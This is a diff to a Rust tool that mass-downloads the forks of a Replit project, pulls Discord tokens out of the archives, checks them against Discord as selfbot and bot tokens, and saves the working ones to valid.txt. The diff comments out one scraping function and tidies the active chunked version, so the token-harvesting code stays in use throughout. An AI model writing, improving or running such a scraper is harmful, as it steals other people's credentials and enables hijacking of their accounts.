@@ -31,85 +31,85 @@ https://discord.gg/qCJwVERPRV\x1b[0m");
 }
 
 
-async fn scrape_forks() {
-    println!("\x1b[0;32mExample URL: /@templates/Discord-Bot-Starter\x1b[0m");
-    println!("\x1b[0;32mPlease input the URL to the repl: [>]\x1b[0m");
-    let mut url = String::new();
-    io::stdin()
-    .read_line(&mut url)
-    .expect("Failed to read line");
+// async fn scrape_forks() {
+//     println!("\x1b[0;32mExample URL: /@templates/Discord-Bot-Starter\x1b[0m");
+//     println!("\x1b[0;32mPlease input the URL to the repl: [>]\x1b[0m");
+//     let mut url = String::new();
+//     io::stdin()
+//     .read_line(&mut url)
+//     .expect("Failed to read line");
 
-    let repl = Replit::new(url.trim());
-    let id = repl.get_id().await;
+//     let repl = Replit::new(url.trim());
+//     let id = repl.get_id().await;
 
-    let (urls, _ids) = repl.get_forks(&id).await;
-    let client = Arc::new(Client::new());
-    let mut futs = FuturesUnordered::new();
-    let mut count = 1;
-    let mut zips = Vec::new();
-
-
+//     let (urls, _ids) = repl.get_forks(&id).await;
+//     let client = Arc::new(Client::new());
+//     let mut futs = FuturesUnordered::new();
+//     let mut count = 1;
+//     let mut zips = Vec::new();
 
 
-    for url in urls {
-        let rep = repl.clone();
-        futs.push(rep.get_zip(client.clone(), url.clone(), count));
-        count += 1;
-    };
 
 
-    while let Some(val) = futs.next().await {
-        match val {
-            Some(val) => zips.push(val),
-            None => (),
-        }
-    }
-    println!("\x1b[0;32mFinished all downloads!\x1b[0m");
-    let mut tokens: Vec<String> = Vec::new();
-    for zip in zips {
-        let mut token = repl.search_extract(zip).await;
-        tokens.append(&mut token);
-    }
-    // Check Selfbot tokens
-    let file_writer = OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open("valid.txt")
-        .await;
-    match file_writer {
-        Ok(mut file_writer) => {
-            file_writer.write_all(format!("Self:\n").as_bytes()).await.unwrap();
-            let mut futs = FuturesUnordered::new();
-            for token in tokens.clone() {
-                futs.push(repl.self_check_tokens(client.clone(), token.clone()));
-            }
-            while let Some(_) = futs.next().await {}
-        },
-        Err(e) => panic!("Could not create file write object, Error: {e}")
-    }
+//     for url in urls {
+//         let rep = repl.clone();
+//         futs.push(rep.get_zip(client.clone(), url.clone(), count));
+//         count += 1;
+//     };
 
 
-    // Check Bot tokens
-    let file_writer = OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open("valid.txt")
-        .await;
-    match file_writer {
-        Ok(mut file_writer) => {
-            file_writer.write_all(format!("Bot:\n").as_bytes()).await.unwrap();
-            let mut futs = FuturesUnordered::new();
-            for token in tokens {
-                futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
-            }
-            while let Some(_) = futs.next().await {}
-        println!("Finished");
-        },
-        Err(e) => panic!("Could not create file write object, Error: {e}")
-    }
+//     while let Some(val) = futs.next().await {
+//         match val {
+//             Some(val) => zips.push(val),
+//             None => (),
+//         }
+//     }
+//     println!("\x1b[0;32mFinished all downloads!\x1b[0m");
+//     let mut tokens: Vec<String> = Vec::new();
+//     for zip in zips {
+//         let mut token = repl.search_extract(zip).await;
+//         tokens.append(&mut token);
+//     }
+//     // Check Selfbot tokens
+//     let file_writer = OpenOptions::new()
+//         .create(true)
+//         .append(true)
+//         .open("valid.txt")
+//         .await;
+//     match file_writer {
+//         Ok(mut file_writer) => {
+//             file_writer.write_all(format!("Self:\n").as_bytes()).await.unwrap();
+//             let mut futs = FuturesUnordered::new();
+//             for token in tokens.clone() {
+//                 futs.push(repl.self_check_tokens(client.clone(), token.clone()));
+//             }
+//             while let Some(_) = futs.next().await {}
+//         },
+//         Err(e) => panic!("Could not create file write object, Error: {e}")
+//     }
 
 
-}
+//     // Check Bot tokens
+//     let file_writer = OpenOptions::new()
+//         .create(true)
+//         .append(true)
+//         .open("valid.txt")
+//         .await;
+//     match file_writer {
+//         Ok(mut file_writer) => {
+//             file_writer.write_all(format!("Bot:\n").as_bytes()).await.unwrap();
+//             let mut futs = FuturesUnordered::new();
+//             for token in tokens {
+//                 futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
+//             }
+//             while let Some(_) = futs.next().await {}
+//         println!("Finished");
+//         },
+//         Err(e) => panic!("Could not create file write object, Error: {e}")
+//     }
+
+
+// }
 
 
 
@@ -141,10 +141,7 @@ async fn chunk_scrape_forks() {
         chunk_count += 1;
         if urls.peek().is_none() || chunk_count >= 50 {
             while let Some(val) = futs.next().await {
-                match val {
-                    Some(val) => zips.push(val),
-                    None => (),
-                }
+                if let Some(val) = val { zips.push(val)}
             }
             chunk_count = 0
         }
@@ -163,12 +160,12 @@ async fn chunk_scrape_forks() {
         .append(true)
         .open("valid.txt")
         .await.unwrap();
-    file_writer.write_all(format!("Self:\n").as_bytes()).await.unwrap();
+    file_writer.write_all("Self:\n".as_bytes()).await.unwrap();
     let mut futs = FuturesUnordered::new();
     for token in tokens.clone() {
         futs.push(repl.self_check_tokens(client.clone(), token.clone()));
     }
-    while let Some(_) = futs.next().await {}
+    while futs.next().await.is_some() {};
 
     // Check Bot tokens
     let mut file_writer = OpenOptions::new()
@@ -176,12 +173,12 @@ async fn chunk_scrape_forks() {
         .append(true)
         .open("valid.txt")
         .await.unwrap();
-    file_writer.write_all(format!("Bot:\n").as_bytes()).await.unwrap();
+    file_writer.write_all("Bot:\n".as_bytes()).await.unwrap();
     let mut futs = FuturesUnordered::new();
     for token in tokens {
         futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
     }
-    while let Some(_) = futs.next().await {}
+    while futs.next().await.is_some() {};
     println!("Finished");
 
 
